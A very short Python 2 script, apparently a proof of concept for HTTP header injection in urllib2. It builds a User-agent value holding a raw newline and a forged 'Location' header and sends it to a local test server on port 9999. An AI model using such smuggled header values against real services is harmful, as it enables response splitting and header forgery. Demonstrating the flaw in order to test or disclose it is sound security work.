# Script for Python 2
import urllib2
opener = urllib2.build_opener()
opener.addheaders = [('User-agent', 'Mozilla/5.0' + chr(0x0A) + "Location: header injection")]
response = opener.open("http://localhost:9999")